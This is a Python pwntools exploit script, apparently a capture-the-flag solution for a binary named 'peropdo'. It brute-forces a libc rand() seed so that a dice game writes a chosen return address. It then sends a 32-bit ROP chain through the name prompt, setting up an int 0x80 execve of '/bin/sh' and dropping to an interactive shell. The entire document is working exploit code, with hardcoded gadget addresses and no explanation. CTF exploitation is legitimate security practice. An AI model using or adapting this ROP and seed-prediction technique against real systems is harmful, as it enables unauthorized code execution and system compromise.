#!/usr/bin/python
from pwn import *
from ctypes import *

libc = CDLL('/lib/x86_64-linux-gnu/libc.so.6')
def getseed(val):
  for i in range(0xffffffff, 0xcf000000, -1):
    print i
    libc.srand(i)
    for j in range(24):
      libc.rand()
    for j in range(100000):
      if libc.rand() == val:
        print "count : %d" % (j + 24)
        print "seed : %d" % i
        return (i, j+24)

def setret(num):
  dummy = num - 24
  while True:
    if dummy > 24:
      p.sendlineafter('roll?', '24')
      p.sendlineafter('again?', 'y')
      dummy -= 24
    else:
      p.sendlineafter('roll?', str(dummy))
      p.sendlineafter('again?', 'y')
      break
  p.sendlineafter('roll?', '24')

if False:
  seed, count = getseed(0x080507b6)
else:
  seed = 48617
  count = 34649
  # pop esp; pop ebx; pop edi; pop esi; pop ebp; ret

p = process('./peropdo') 
name = 0x080ECFC0
pop_ecx_ret = 0x080e5ee1
pop_eax_ret = 0x080E3525
pop_ebx_edx_ret = 0x0806f2f9
inc_eax_ret = 0x0807bf05
int80 = 0x08049551

rop = p32(seed)           #ebx
rop += '/bin/sh\x00'      #edi, esi
rop += p32(0)             #ebp

rop += p32(pop_ebx_edx_ret) 
rop += p32(name+4)        #ebx
rop += p32(0)             #edx

rop += p32(pop_ecx_ret)
rop += p32(name + 20)     #ecx

rop += p32(pop_eax_ret)
rop += p32(8)             #eax
rop += p32(inc_eax_ret)
rop += p32(inc_eax_ret)
rop += p32(inc_eax_ret)

rop += p32(int80)

p.sendlineafter('name?', rop)
setret(count)

p.interactive()
